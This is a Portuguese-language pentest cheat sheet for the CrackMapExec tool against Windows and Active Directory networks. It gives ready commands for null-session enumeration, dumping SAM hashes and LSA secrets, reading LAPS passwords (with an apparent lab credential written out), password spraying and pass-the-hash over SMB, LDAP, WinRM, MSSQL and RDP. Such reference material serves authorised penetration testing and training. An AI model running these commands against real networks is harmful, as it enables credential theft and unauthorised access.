Crackmapexec
========================

Quado se trata de pentest em ambientes Windows/Active Directory não podemos deixar de mencionar o [**crackmaepxec**](https://github.com/byt3bl33d3r/CrackMapExec). Ela foi desenvolvida no para facilitar a vida do pentester varrer grandes redes sendo considerada o canivete suíço para tal fim. Mas, sem delongas, vamos demonstrar o poder dessa ferramenta e seus vários modos de uso e protocolos suportados...


## Uso genérico

    crackmapexec <protocolo> <opções_de_cada_protocolo>


## SMB

### Null session

Obter política de senhas via null session

    crackmapexec smb <endereço_ip> --pass-pol

Obter compartilhamentos via null session

    crackmapexec smb <endereço_ip> --shares



### Com usuário privilegiado

Usuário administrador local:

    crackmapexec smb <endereço_ip> -u Administrator

Quando obtido **Pwn3d!** no output da ferramenta, significa que temos privilégios no host alvo, sendo possível a extração dos hashes de senha da máquina:

    crackmapexec smb <endereço_ip> -u <usuario> -p <senha> --sam 

Outra opção seria de fazer o dump do lsass:

    crackmapexec smb <endereço_ip> -u <usuario> -p <senha> --lsa

## LAPS

read LAPS passwords (necessário ter permissão pe LAPS_Readers):

    crackmapexec ldap 10.10.11.152 -u svc_deploy -p E3R$Q62^12p7PLlC%KWaxuaV' -M laps


## Password spraying

    crackmapexec ldap hosts.txt -u users.txt -p P@ssword! --continue
    
    crackmapexec smb 10.10.11.152 -u users.txt -p passwords_test.txt --continue
    
    crackmapexec winrm 10.10.11.152 -u users.txt -p passwords_test.txt --continue

## Pass the hash

    crackmapexec ldap hosts.txt -u users.txt -H :<nthash> --continue
    
    crackmapexec smb <COMPUTERNAME> -d <DOMAIN> -u <USER> -H <NTLM HASH>
    crackmapexec winrm <COMPUTERNAME> -d <DOMAIN> -u <USER> -H <NTLM HASH>
    crackmapexec mssql <COMPUTERNAME> -d <DOMAIN> -u <USER> -H <NTLM HASH>
    crackmapexec rdp <COMPUTERNAME> -d <DOMAIN> -u <USER> -H <NTLM HASH>